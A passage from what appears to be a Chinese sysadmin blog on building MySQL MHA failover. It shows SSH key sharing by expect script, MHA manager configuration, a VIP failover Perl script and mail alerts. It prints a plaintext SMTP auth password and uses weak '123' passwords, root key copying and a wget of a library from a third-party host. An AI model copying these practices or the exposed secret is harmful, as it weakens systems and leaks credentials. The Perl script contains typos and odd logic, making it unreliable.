&quot;password&quot; &#123; send &quot;123\n&quot; &#125;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">        expect eof</span><br><span class="hljs-string">EOF</span><br><br><span class="hljs-keyword">done</span><br><br>yum -y install mha4mysql-manager-0.58-0.el7.centos.noarch.rpm<br>yum -y install mha4mysql-node-0.58-0.el7.centos.noarch.rpm<br></code></pre></td></tr></table></figure><h2 id="3-实现MySQL主从机器之间的SSH-KEY互信，以及manager端对于MySQL主从节点的互信"><a href="#3-实现MySQL主从机器之间的SSH-KEY互信，以及manager端对于MySQL主从节点的互信" class="headerlink" title="3.实现MySQL主从机器之间的SSH-KEY互信，以及manager端对于MySQL主从节点的互信"></a>3.实现MySQL主从机器之间的SSH-KEY互信，以及manager端对于MySQL主从节点的互信</h2><p>先生成自己的ssh-key，再将自己的信息复制到自己的节点，known_hosts里面已经有4个机器了，刚刚复制过</p><p>将自己的.ssh复制到其他机器的:/root目录下</p><p>:/root/.ssh：代表也拷贝.ssh目录本身</p><p>:/root/.ssh/*：代表拷贝.ssh目录下的东西</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs bash">ssh-keygen<br>ssh-copy-id 10.0.0.130<br><br>[10:34:49 root@proxy ~]<span class="hljs-comment">#cat .ssh/known_hosts </span><br>10.0.0.132 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOEAlD1m567k7Q2QEem7PjJOu2e91dNnnvu3BieR3f3TVFQdqsWqGI/qCgJVLQ7KWWPNFy137uYUwviZa7d8Q/Q=<br>10.0.0.128 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBGNiEH9kMJZU+HXl2fpHO2JQ9tIbiVh5qljJS+ZoGh1iNzX3S7pGM/Dd16BkSVJgrgMyXOdr832C7na6SIgoylM=<br>10.0.0.129 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOf8Uo6Tm0vy+2g9ctYsTwc/tfWcXHQtY5EywK0odPY1KFdXvw/bi75eyTbBqMUnX90RY36V+SV2CF05KCP1FJ0=<br>10.0.0.130 ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOf8Uo6Tm0vy+2g9ctYsTwc/tfWcXHQtY5EywK0odPY1KFdXvw/bi75eyTbBqMUnX90RY36V+SV2CF05KCP1FJ0=<br><br><span class="hljs-comment">##复制ssh认证</span><br><span class="hljs-comment">#!/bin/bash</span><br>host=(10.0.0.128<br>10.0.0.132<br>10.0.0.129)<br><br><span class="hljs-comment">##expect判断直接scp rpm包过去，还是得先进行ssh-copy-id的验证</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;host[*]&#125;</span>;<span class="hljs-keyword">do</span><br>  expect &lt;&lt;<span class="hljs-string">EOF</span><br><span class="hljs-string">        spawn ssh-copy-id $i</span><br><span class="hljs-string">        expect &#123;</span><br><span class="hljs-string">             &quot;yes/no&quot; &#123; send &quot;yes\n&quot;; exp_continue &#125;</span><br><span class="hljs-string">             &quot;password&quot; &#123; send &quot;123\n&quot; &#125;;</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">        expect eof</span><br><span class="hljs-string">EOF</span><br>      scp /root/.ssh <span class="hljs-variable">$i</span>:/root<br><span class="hljs-keyword">done</span><br></code></pre></td></tr></table></figure><h2 id="4-manager端配置"><a href="#4-manager端配置" class="headerlink" title="4.manager端配置"></a>4.manager端配置</h2><h3 id="app1-cnf配置"><a href="#app1-cnf配置" class="headerlink" title="app1.cnf配置"></a>app1.cnf配置</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##新建配置文件的目录</span><br><span class="hljs-built_in">mkdir</span> -p /data/mastermha/app1<br><span class="hljs-built_in">touch</span> /data/mastermha/app1<br><br>vim /data/mastermha/app1.cnf<br><span class="hljs-comment">##app1.cnf文件配置</span><br>[server default] <br>user=mhauser <span class="hljs-comment">##在主节点上创建用户，自动同步到从节点---&gt;完成</span><br>password=123<br>manager_workdir=/data/mastermha/app1/<br>manager_log=/data/mastermha/app1/manager.log <span class="hljs-comment">##自动创建管理端的日志</span><br>remote_workdir=/data/mastermha/app1/<br>ssh_user=root<br>repl_user=<span class="hljs-built_in">sync</span> ---&gt;完成<br>repl_password=123<br>ping_interval=1<br>master_ip_failover_script=/usr/local/bin/master_ip_failover<br>report_script=/usr/local/bin/sendmail.sh<br>check_repl_delay=0<br>master_binlog_dir=/data/mysql/binlog <span class="hljs-comment">##binlog位置</span><br><br>[server1]<br>hostname=10.0.0.132<br>candidate_master=1 <span class="hljs-comment">##master优先做主</span><br>[server2]<br>hostname=10.0.0.128<br>candidate_master=1  <span class="hljs-comment">##master优先做主</span><br>[server3]<br>hostname=10.0.0.129<br><br><span class="hljs-comment">##检查binlog，也可以开启general_log观察结果</span><br>[(none)]&gt;show variables like <span class="hljs-string">&#x27;%log_bin%&#x27;</span>;<br><br><span class="hljs-comment">##主从都开启general_log</span><br>select @@general_log;<br><span class="hljs-built_in">set</span> global general_log=ON;<br></code></pre></td></tr></table></figure><h3 id="MySQL集群节点授权mha账户"><a href="#MySQL集群节点授权mha账户" class="headerlink" title="MySQL集群节点授权mha账户"></a>MySQL集群节点授权mha账户</h3><p>可以修改MySQL集群的配置，所以需要能够有所有库的所有权限，需要和app1.cnf内一致</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs sql">##在主节点上创建用户，自动同步到从节点<br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">create</span> <span class="hljs-keyword">user</span> mhauser@<span class="hljs-string">&#x27;%&#x27;</span> identified <span class="hljs-keyword">by</span> <span class="hljs-string">&#x27;123&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.01</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">grant</span> <span class="hljs-keyword">all</span> <span class="hljs-keyword">on</span> <span class="hljs-operator">*</span>.<span class="hljs-operator">*</span> <span class="hljs-keyword">to</span> mhauser@<span class="hljs-string">&#x27;%&#x27;</span>;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span>flush privileges;<br>Query OK, <span class="hljs-number">0</span> <span class="hljs-keyword">rows</span> affected (<span class="hljs-number">0.00</span> sec)<br><br>[hellodb]<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>,host <span class="hljs-keyword">from</span> mysql.user;<br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> <span class="hljs-keyword">user</span>             <span class="hljs-operator">|</span> host      <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-operator">|</span> mhauser          <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mycat            <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> sync             <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wp               <span class="hljs-operator">|</span> <span class="hljs-operator">%</span>         <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> catyer           <span class="hljs-operator">|</span> <span class="hljs-number">10.0</span><span class="hljs-number">.0</span>.<span class="hljs-operator">%</span>  <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.infoschema <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.session    <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> mysql.sys        <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> root             <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">|</span> wpuser           <span class="hljs-operator">|</span> localhost <span class="hljs-operator">|</span><br><span class="hljs-operator">+</span><span class="hljs-comment">------------------+-----------+</span><br><span class="hljs-number">11</span> <span class="hljs-keyword">rows</span> <span class="hljs-keyword">in</span> <span class="hljs-keyword">set</span> (<span class="hljs-number">0.00</span> sec)<br></code></pre></td></tr></table></figure><h3 id="master节点添加一个VIP，参考perl脚本的写法"><a href="#master节点添加一个VIP，参考perl脚本的写法" class="headerlink" title="master节点添加一个VIP，参考perl脚本的写法"></a>master节点添加一个VIP，参考perl脚本的写法</h3><p>master down了可以将master飘到别的master上</p><p>将perl脚本放到/use/local/bin下面，临时加</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $ssh_start_vip = <span class="hljs-string">&quot;/sbin/ifconfig ens33:$key $vip&quot;</span>; <span class="hljs-comment">##网卡上加多一个IP地址，网卡名记得修改，</span><br><span class="hljs-keyword">my</span> $ssh_stop_vip = <span class="hljs-string">&quot;/sbin/ifconfig eens33:$key down&quot;</span>;<br><br><span class="hljs-comment">##master节点配置</span><br>ifconfig ens224<br>ifconfig ens224:<span class="hljs-number">1</span> <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">100</span>/<span class="hljs-number">24</span><br><span class="hljs-number">2</span>: ens224: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu <span class="hljs-number">1500</span> qdisc mq <span class="hljs-keyword">state</span> UP group default qlen <span class="hljs-number">1000</span><br>    <span class="hljs-keyword">link</span>/ether <span class="hljs-number">00</span>:0c:<span class="hljs-number">29</span>:<span class="hljs-number">33</span>:<span class="hljs-number">3</span>d:<span class="hljs-number">85</span> brd ff:ff:ff:ff:ff:ff<br>    inet <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">132</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span> scope global noprefixroute ens224<br>       valid_lft forever preferred_lft forever<br>    inet <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">100</span>/<span class="hljs-number">24</span> brd <span class="hljs-number">10.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">255</span> scope global secondary ens224:<span class="hljs-number">1</span><br>       valid_lft forever preferred_lft forever<br>    inet6 fe8<span class="hljs-number">0</span>::<span class="hljs-number">20</span>c:<span class="hljs-number">29</span>ff:fe33:<span class="hljs-number">3</span>d85/<span class="hljs-number">64</span> scope <span class="hljs-keyword">link</span> noprefixroute <br>       valid_lft forever preferred_lft forever<br></code></pre></td></tr></table></figure><h3 id="perl脚本的实现：-usr-local-bin-master-ip-failover"><a href="#perl脚本的实现：-usr-local-bin-master-ip-failover" class="headerlink" title="perl脚本的实现：/usr/local/bin/master_ip_failover"></a>perl脚本的实现：/usr/local/bin/master_ip_failover</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">把这个脚本放在这个路径下，记得修改执行权限<br><span class="hljs-built_in">chmod</span> +x /usr/local/bin/master_ip_failover<br></code></pre></td></tr></table></figure><p>脚本实现</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-comment">#!/usr/bin/env perl</span><br><br><span class="hljs-comment">#  Copyright (C) 2011 DeNA Co.,Ltd.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  This program is free software; you can redistribute it and/or modify</span><br><span class="hljs-comment">#  it under the terms of the GNU General Public License as published by</span><br><span class="hljs-comment">#  the Free Software Foundation; either version 2 of the License, or</span><br><span class="hljs-comment">#  (at your option) any later version.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  This program is distributed in the hope that it will be useful,</span><br><span class="hljs-comment">#  but WITHOUT ANY WARRANTY; without even the implied warranty of</span><br><span class="hljs-comment">#  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the</span><br><span class="hljs-comment">#  GNU General Public License for more details.</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment">#  You should have received a copy of the GNU General Public License</span><br><span class="hljs-comment">#   along with this program; if not, write to the Free Software</span><br><span class="hljs-comment">#  Foundation, Inc.,</span><br><span class="hljs-comment">#  51 Franklin Street, Fifth Floor, Boston, MA  02110-1301  USA</span><br><br><span class="hljs-comment">## Note: This is a sample script and is not complete. Modify the script based on your environment.</span><br><br><span class="hljs-keyword">use</span> strict;<br><span class="hljs-keyword">use</span> warnings <span class="hljs-string">FATAL =&gt;</span> <span class="hljs-string">&#x27;all&#x27;</span>;<br><br><span class="hljs-keyword">use</span> Getopt::Long;<br><span class="hljs-keyword">use</span> MHA::DBHelper;<br><br><span class="hljs-keyword">my</span> (<br>  $command,        $ssh_user,         $orig_master_host,<br>  $orig_master_ip, $orig_master_port, $new_master_host,<br>  $new_master_ip,  $new_master_port,  $new_master_user,<br>  $new_master_password<br>);<br><span class="hljs-keyword">my</span> $vip = <span class="hljs-string">&#x27;10.0.0.100/24&#x27;</span>; <span class="hljs-comment">##VIP给程序的显示</span><br><span class="hljs-keyword">my</span> $key = <span class="hljs-string">&quot;1&quot;</span>;<br><span class="hljs-keyword">my</span> $ssh_start_vip = <span class="hljs-string">&quot;/sbin/ifconfig eens33:$key $vip&quot;</span>; <span class="hljs-comment">##网卡上加多一个IP地址，网卡名记得修改</span><br><span class="hljs-keyword">my</span> $ssh_stop_vip = <span class="hljs-string">&quot;/sbin/ifconfig eens33:$key down&quot;</span>;<br><br>GetOptions(<br>  <span class="hljs-string">&#x27;command=s&#x27;</span>             =&gt; \$command,<br>  <span class="hljs-string">&#x27;ssh_user=s&#x27;</span>            =&gt; \$ssh_user,<br>  <span class="hljs-string">&#x27;orig_master_host=s&#x27;</span>    =&gt; \$orig_master_host,<br>  <span class="hljs-string">&#x27;orig_master_ip=s&#x27;</span>      =&gt; \$orig_master_ip,<br>  <span class="hljs-string">&#x27;orig_master_port=i&#x27;</span>    =&gt; \$orig_master_port,<br>  <span class="hljs-string">&#x27;new_master_host=s&#x27;</span>     =&gt; \$new_master_host,<br>  <span class="hljs-string">&#x27;new_master_ip=s&#x27;</span>       =&gt; \$new_master_ip,<br>  <span class="hljs-string">&#x27;new_master_port=i&#x27;</span>     =&gt; \$new_master_port,<br>  <span class="hljs-string">&#x27;new_master_user=s&#x27;</span>     =&gt; \$new_master_user,<br>  <span class="hljs-string">&#x27;new_master_password=s&#x27;</span> =&gt; \$new_master_password,<br>);<br><br><span class="hljs-keyword">exit</span> &amp;main();<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">main</span> </span>&#123;<br>  <span class="hljs-keyword">if</span> ( $command eq <span class="hljs-string">&quot;stop&quot;</span> || $command eq <span class="hljs-string">&quot;stopssh&quot;</span> ) &#123;<br><br>    <span class="hljs-comment"># $orig_master_host, $orig_master_ip, $orig_master_port are passed.</span><br>    <span class="hljs-comment"># If you manage master ip address at global catalog database,</span><br>    <span class="hljs-comment"># invalidate orig_master_ip here.</span><br>    <span class="hljs-keyword">my</span> $exit_code = <span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">eval</span> &#123;<br><br>      <span class="hljs-comment"># updating global catalog, etc</span><br>      $exit_code = <span class="hljs-number">0</span>;<br>    &#125;;<br>    <span class="hljs-keyword">if</span> ($@) &#123;<br>      <span class="hljs-keyword">warn</span> <span class="hljs-string">&quot;Got Error: $@\n&quot;</span>;<br>      <span class="hljs-keyword">exit</span> $exit_code;<br>    &#125;<br>    <span class="hljs-keyword">exit</span> $exit_code;<br>  &#125;<br>    <span class="hljs-keyword">elsif</span> ( $command eq <span class="hljs-string">&quot;start&quot;</span> ) &#123;<br><br>        <span class="hljs-comment"># all arguments are passed.</span><br>        <span class="hljs-comment"># If you manage master ip address at global catalog database,</span><br>        <span class="hljs-comment"># activate new_master_ip here.</span><br>        <span class="hljs-comment"># You can also grant write access (create user, set read_only=0, etc) here.</span><br>        <span class="hljs-keyword">my</span> $exit_code = <span class="hljs-number">10</span>;<br>        <span class="hljs-keyword">eval</span> &#123;<br>            <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Enabling the VIP - $vip on the new master - $new_master_host \n&quot;</span>;<br>            &amp;start_vip();<br>            &amp;stop_vip();<br>            $exit_code = <span class="hljs-number">0</span>;<br>        &#125;;<br>        <span class="hljs-keyword">if</span> ($@) &#123;<br>            <span class="hljs-keyword">warn</span> $@;<br>            <span class="hljs-keyword">exit</span> $exit_code;<br>        &#125;<br>        <span class="hljs-keyword">exit</span> $exit_code;<br>    &#125;<br>    <span class="hljs-keyword">elsif</span> ( $command eq <span class="hljs-string">&quot;status&quot;</span> ) &#123;<br>        <span class="hljs-keyword">print</span> <span class="hljs-string">&quot;Checking the Status of the script.. OK \n&quot;</span>;<br>        <span class="hljs-string">`ssh $ssh_user\@$orig_master_host \&quot; $ssh_start_vip \&quot;`</span>;<br>        <span class="hljs-keyword">exit</span> <span class="hljs-number">0</span>;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        &amp;usage();<br>        <span class="hljs-keyword">exit</span> <span class="hljs-number">1</span>;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">start_vip</span>() </span>&#123;<br>    <span class="hljs-string">`ssh $ssh_user\@$new_master_host \&quot; $ssh_start_vip \&quot;`</span>;<br>&#125;<br><span class="hljs-comment"># A simple system call that disable the VIP on the old_master </span><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">stop_vip</span>() </span>&#123;<br>   <span class="hljs-string">`ssh $ssh_user\@$orig_master_host \&quot; $ssh_stop_vip \&quot;`</span>;<br>&#125;<br><br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">usage</span> </span>&#123;<br>  <span class="hljs-keyword">print</span><br><span class="hljs-string">&quot;Usage: master_ip_failover --command=start|stop|stopssh|status --orig_master_host=host --orig_master_ip=ip --orig_master_port=port --new_master_host=host --new_master_ip=ip --new_master_port=port\n&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="自动发送告警邮件实现"><a href="#自动发送告警邮件实现" class="headerlink" title="自动发送告警邮件实现"></a>自动发送告警邮件实现</h3><p>配置163邮箱的auth，需要update一下postfix的包，以免postfix这个邮件服务太老了</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">vim /etc.mail.rc<br><span class="hljs-built_in">set</span> from=catyer.163.com<br><span class="hljs-built_in">set</span> smtp=smtp.163.com<br><span class="hljs-built_in">set</span> smtp-auth-user=catyer.163.com<br><span class="hljs-built_in">set</span> smtp-auth-password=SOKFDDZOQCDEZCYY<br><br>yum -y install postfix<br><br>vim sendmail.sh<br><span class="hljs-comment">##记得修改执行权限</span><br><span class="hljs-built_in">chmod</span> +x sendmail.sh<br><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;MHA is down!&quot;</span> | mail -s <span class="hljs-string">&quot;MHA Warning&quot;</span> catyer@163.com<br></code></pre></td></tr></table></figure><h2 id="5-检查app1-cnf文件的语法"><a href="#5-检查app1-cnf文件的语法" class="headerlink" title="5.检查app1.cnf文件的语法"></a>5.检查app1.cnf文件的语法</h2><p>successfully，检查到各个节点的通信</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-comment">##检查各个节点之间的SSH连接</span><br>masterha_check_ssh --conf=/root/mastermha/app1.cnf<br><br><span class="hljs-comment">##检查主从复制</span><br>masterha_check_repl --conf=/root/mastermha/app1.cnf<br></code></pre></td></tr></table></figure><p><img src="2792175-20220925210233351-784902349.png" alt="image-20220918122603102"></p><h3 id="抛出异常，无法识别super-read-only变量，缺少libmysqlclient-so-18依赖文件"><a href="#抛出异常，无法识别super-read-only变量，缺少libmysqlclient-so-18依赖文件" class="headerlink" title="抛出异常，无法识别super_read_only变量，缺少libmysqlclient.so.18依赖文件"></a>抛出异常，无法识别super_read_only变量，缺少libmysqlclient.so.18依赖文件</h3><p>不用修改任何的东西，只是缺少这个libmysqlclient.so.18依赖库文件</p><p>也不是什么super_read_only没开，都不关事的</p><p><img src="2792175-20220925210233903-1592346234.png" alt="image-20220918150709875"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">Checking <span class="hljs-keyword">if</span> super_read_only is defined and turned on..install_driver(mysql) failed: Can<span class="hljs-string">&#x27;t load &#x27;</span>/usr/lib64/perl5/vendor_perl/auto/DBD/mysql/mysql.so<span class="hljs-string">&#x27; for module DBD::mysql: libmysqlclient.so.18: cannot open shared object file: No such file or directory at /usr/lib64/perl5/DynaLoader.pm line 190.</span><br><span class="hljs-string"> at (eval 11) line 3.</span><br><span class="hljs-string">Compilation failed in require at (eval 11) line 3</span><br><span class="hljs-string"></span><br><span class="hljs-string">vim +244 /usr/share/perl5/vendor_perl/MHA/SlaveUtil.pm</span><br><span class="hljs-string">my $sth = $dbh-&gt;prepare(&quot;SELECT 0 as Value&quot;);</span><br><span class="hljs-string">#$dbh-&gt;do(&quot;SET GLOBAL super_read_only=off;&quot;);</span><br><span class="hljs-string">$dbh-&gt;do(&quot;SET GLOBAL read_only=on;&quot;);</span><br><span class="hljs-string"></span><br><span class="hljs-string">my $sth = $dbh-&gt;prepare(&quot;SELECT \@\@global.super_read_only as Value&quot;);</span><br><span class="hljs-string">set global super_read_only=ON;</span><br><span class="hljs-string"></span><br><span class="hljs-string">my $sth = $dbh-&gt;prepare(&quot;SELECT 1 as Value&quot;); ##---&gt;心跳检查</span><br><span class="hljs-string"></span><br><span class="hljs-string">ln -s /usr/local/mysql/lib/libmysqlclient.so.21.2.30 /usr/lib64/libmysqlclient.so.21.2.30</span><br><span class="hljs-string">wget -O /usr/lib/libmysqlclient.so.18 http://files.directadmin.com/services/es_7.0_64/libmysqlclient.so.18</span><br><span class="hljs-string"></span><br><span class="hljs-string">set global global super_read_only=OFF;</span><br></code></pre></td></tr></table></figure><p>解决办法：因为是二进制安装的，所以缺少这个包mysql-community-libs-compat-8.0.30-1.el7.x86_64.rpm，从官网下载了，不知道为啥安装不上，缺少依赖</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs bash">yum -y install mysql-community-libs<br>上次元数据过期检查：0:45:58 前，执行于 2022年09月18日 星期日 15时49分55秒。<br>未找到匹配的参数: mysql-community-libs<br>错误：没有任何匹配: mysql-community-libs<br><br><span class="hljs-comment">##从别的机器使用yum安装mysql-8.0.30，拷贝/usr/lib64/mysql/libmysqlclient.so.18过来</span><br>host=(10.0.0.128<br>10.0.0.132<br>10.0.0.129)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-variable">$&#123;host[*]&#125;</span>;<span class="hljs-keyword">do</span><br>        scp /usr/lib64/mysql/libmysqlclient.so.18 <span class="hljs-variable">$i</span>:/usr/lib64/mysql/<br><span class="hljs-keyword">done</span><br>[root@master mysql]<span class="hljs-comment">#ls</span><br>libmysqlclient.a  libmysqlclient.so  libmysqlclient.so.18  